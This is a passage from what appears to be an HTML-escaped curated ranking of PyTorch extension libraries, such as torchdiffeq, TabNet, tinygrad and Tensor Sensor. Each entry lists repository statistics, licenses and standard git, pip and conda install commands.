&lt;pre&gt;&lt;code&gt; conda install -c conda-forge lightning-flash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sksq96/pytorch-summary&#34;&gt;pytorch-summary&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 3.5K · 💤) - Model summary in PyTorch similar to `model.summary()`.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sksq96/pytorch-summary&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 390 · 📦 5.1K · 📋 160 - 73% open · ⏱️ 10.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/sksq96/pytorch-summary&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchsummary&#34;&gt;PyPi&lt;/a&gt; (📥 100K / month · 📦 71 · ⏱️ 26.09.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchsummary&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jettify/pytorch-optimizer&#34;&gt;pytorch-optimizer&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 2.4K) - torch-optimizer -- collection of optimizers for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jettify/pytorch-optimizer&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 230 · 📦 600 · 📋 45 - 35% open · ⏱️ 11.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jettify/pytorch-optimizer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch_optimizer&#34;&gt;PyPi&lt;/a&gt; (📥 54K / month · 📦 23 · ⏱️ 31.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch_optimizer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/torch-optimizer&#34;&gt;Conda&lt;/a&gt; (📥 1.4K · ⏱️ 31.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge torch-optimizer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rtqichen/torchdiffeq&#34;&gt;torchdiffeq&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 4.1K) - Differentiable ODE solvers with full GPU support and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rtqichen/torchdiffeq&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 730 · 📦 250 · 📋 180 - 22% open · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rtqichen/torchdiffeq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchdiffeq&#34;&gt;PyPi&lt;/a&gt; (📥 6.5K / month · 📦 20 · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchdiffeq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/torchdiffeq&#34;&gt;Conda&lt;/a&gt; (📥 5.1K · ⏱️ 03.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge torchdiffeq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rusty1s/pytorch_sparse&#34;&gt;PyTorch Sparse&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 640) - PyTorch Extension Library of Optimized Autograd Sparse.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rusty1s/pytorch_sparse&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 87 · 📋 180 - 17% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rusty1s/pytorch_sparse&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch-sparse&#34;&gt;PyPi&lt;/a&gt; (📥 24K / month · 📦 37 · ⏱️ 11.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch-sparse&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytorch_sparse&#34;&gt;Conda&lt;/a&gt; (📥 88K · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytorch_sparse&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dreamquark-ai/tabnet&#34;&gt;TabNet&lt;/a&gt;&lt;/b&gt; (🥈24 · ⭐ 1.7K) - PyTorch implementation of TabNet paper :.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dreamquark-ai/tabnet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 340 · 📋 240 - 15% open · ⏱️ 23.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dreamquark-ai/tabnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch-tabnet&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 7 · ⏱️ 02.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch-tabnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytorch-tabnet&#34;&gt;Conda&lt;/a&gt; (📥 490 · ⏱️ 30.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytorch-tabnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/BloodAxe/pytorch-toolbelt&#34;&gt;Pytorch Toolbelt&lt;/a&gt;&lt;/b&gt; (🥈24 · ⭐ 1.2K) - PyTorch extensions for fast R&amp;amp;D prototyping and Kaggle.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/BloodAxe/pytorch-toolbelt&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 94 · 📋 28 - 21% open · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/BloodAxe/pytorch-toolbelt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch_toolbelt&#34;&gt;PyPi&lt;/a&gt; (📥 8.8K / month · 📦 6 · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch_toolbelt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rusty1s/pytorch_scatter&#34;&gt;torch-scatter&lt;/a&gt;&lt;/b&gt; (🥈24 · ⭐ 990) - PyTorch Extension Library of Optimized Scatter Operations. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rusty1s/pytorch_scatter&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 110 · 📋 260 - 9% open · ⏱️ 25.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rusty1s/pytorch_scatter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch-scatter&#34;&gt;PyPi&lt;/a&gt; (📥 30K / month · 📦 43 · ⏱️ 22.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch-scatter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytorch_scatter&#34;&gt;Conda&lt;/a&gt; (📥 77K · ⏱️ 21.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytorch_scatter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/asappresearch/sru&#34;&gt;SRU&lt;/a&gt;&lt;/b&gt; (🥈23 · ⭐ 2K · 💤) - Training RNNs as Fast as CNNs (https://arxiv.org/abs/1709.02755). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/asappresearch/sru&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 300 · 📦 18 · 📋 120 - 46% open · ⏱️ 19.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/asappresearch/sru&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sru&#34;&gt;PyPi&lt;/a&gt; (📥 1.5K / month · 📦 3 · ⏱️ 17.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sru&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tristandeleu/pytorch-meta&#34;&gt;Torchmeta&lt;/a&gt;&lt;/b&gt; (🥈23 · ⭐ 1.6K · 💤) - A collection of extensions and data-loaders for few-shot.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tristandeleu/pytorch-meta&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 210 · 📦 90 · 📋 140 - 34% open · ⏱️ 20.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tristandeleu/pytorch-meta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchmeta&#34;&gt;PyPi&lt;/a&gt; (📥 2.6K / month · ⏱️ 20.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchmeta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rwightman/gen-efficientnet-pytorch&#34;&gt;EfficientNets&lt;/a&gt;&lt;/b&gt; (🥈23 · ⭐ 1.5K · 💤) - Pretrained EfficientNet, EfficientNet-Lite, MixNet,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rwightman/gen-efficientnet-pytorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 5 · 🔀 190 · 📦 100 · 📋 53 - 3% open · ⏱️ 08.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rwightman/gen-efficientnet-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/geffnet&#34;&gt;PyPi&lt;/a&gt; (📥 13K / month · 📦 1 · ⏱️ 08.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install geffnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/higher&#34;&gt;Higher&lt;/a&gt;&lt;/b&gt; (🥈23 · ⭐ 1.4K · 💤) - higher is a pytorch library allowing users to obtain higher.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/higher&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 9 · 🔀 98 · 📦 140 · 📋 99 - 49% open · ⏱️ 26.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/higher&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/higher&#34;&gt;PyPi&lt;/a&gt; (📥 20K / month · 📦 2 · ⏱️ 14.07.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install higher&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lucidrains/performer-pytorch&#34;&gt;Performer Pytorch&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 830) - An implementation of Performer, a linear attention-based.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lucidrains/performer-pytorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 110 · 📦 46 · 📋 76 - 43% open · ⏱️ 02.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lucidrains/performer-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/performer-pytorch&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 4 · ⏱️ 02.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install performer-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lucidrains/reformer-pytorch&#34;&gt;reformer-pytorch&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1.7K) - Reformer, the efficient Transformer, in Pytorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lucidrains/reformer-pytorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 230 · 📋 120 - 11% open · ⏱️ 06.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lucidrains/reformer-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/reformer-pytorch&#34;&gt;PyPi&lt;/a&gt; (📥 4.4K / month · ⏱️ 06.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install reformer-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google-research/torchsde&#34;&gt;torchsde&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 980 · 💤) - Differentiable SDE solvers with GPU support and efficient.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google-research/torchsde&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 5 · 🔀 100 · 📦 15 · 📋 48 - 14% open · ⏱️ 26.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google-research/torchsde&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchsde&#34;&gt;PyPi&lt;/a&gt; (📥 950 / month · ⏱️ 20.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchsde&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/torchsde&#34;&gt;Conda&lt;/a&gt; (📥 9.3K · ⏱️ 12.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge torchsde&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/harvardnlp/pytorch-struct&#34;&gt;Torch-Struct&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 1K) - Fast, general, and tested differentiable structured prediction.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/harvardnlp/pytorch-struct&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 81 · 📋 54 - 44% open · ⏱️ 30.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/harvardnlp/pytorch-struct&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch-struct&#34;&gt;PyPi&lt;/a&gt; (📥 44K / month · ⏱️ 14.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch-struct&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/szagoruyko/pytorchviz&#34;&gt;pytorchviz&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 2.2K · 💤) - A small package to create visualizations of PyTorch execution.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/szagoruyko/pytorchviz&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 230 · 📦 670 · 📋 56 - 37% open · ⏱️ 15.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/szagoruyko/pytorchviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/abhishekkrthakur/tez&#34;&gt;Tez&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 1K) - Tez is a super-simple and lightweight Trainer for PyTorch. It also.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/abhishekkrthakur/tez&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1 · 🔀 130 · 📦 25 · 📋 32 - 50% open · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/abhishekkrthakur/tez&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tez&#34;&gt;PyPi&lt;/a&gt; (📥 660 / month · 📦 2 · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tez&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/geohot/tinygrad&#34;&gt;tinygrad&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 6K) - You like pytorch? You like micrograd? You love tinygrad!. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/geohot/tinygrad&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 59 · 🔀 600 · 📦 2 · 📋 110 - 19% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/geohot/tinygrad&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/parrt/tensor-sensor&#34;&gt;Tensor Sensor&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 640) - The goal of this library is to generate more helpful.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/parrt/tensor-sensor&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 33 · 📦 7 · 📋 23 - 34% open · ⏱️ 07.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/parrt/tensor-sensor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensor-sensor&#34;&gt;PyPi&lt;/a&gt; (📥 1.7K / month · ⏱️ 11.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensor-sensor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensor-sensor&#34;&gt;Conda&lt;/a&gt; (📥 280 · ⏱️ 11.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensor-sensor&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; 